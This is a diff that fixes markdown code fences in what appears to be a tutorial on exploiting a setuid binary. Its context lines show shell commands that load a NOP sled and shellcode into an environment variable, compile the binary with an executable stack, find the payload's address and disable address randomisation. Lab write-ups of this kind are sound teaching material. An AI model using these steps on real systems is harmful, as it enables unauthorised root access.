@@ -67,7 +67,7 @@ Let's have a look at it in hex:
 
 And let's get it into an environment variable `SHELLCODE`, prepended with a generous [NOP sled]:
 
-bash``
+```bash
 (32)test@trout:$ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
 (32)test@trout:$ echo $SHELLCODE
 111ə̀j
@@ -80,7 +80,7 @@ bash``
 
 And now we'll compile (ensuring the stack is executable), afterwards changing back to `root` temporarily to change the owner and permissions (including setting the `setuid` bit to make the privilege escalation hack possible).
 
-bash``
+```bash
 (32)test@trout:$ gcc -o cat_pictures -ggdb3 -z execstack cat_pictures.c
 (32)test@trout:$ exit
 (32)root@trout:# chown root cat_pictures
@@ -125,6 +125,7 @@ After having injected our payload into the `SHELLCODE` environment variable, we 
 	(32)test@trout:$ ./getenv SHELLCODE
 	SHELLCODE -> 0xffdb3d84
 	```
+
 	Now, let's turn it off.  Although, not strictly necessary, it means that the memory addresses won't change, which makes the exploit easier.
 
 	```bash
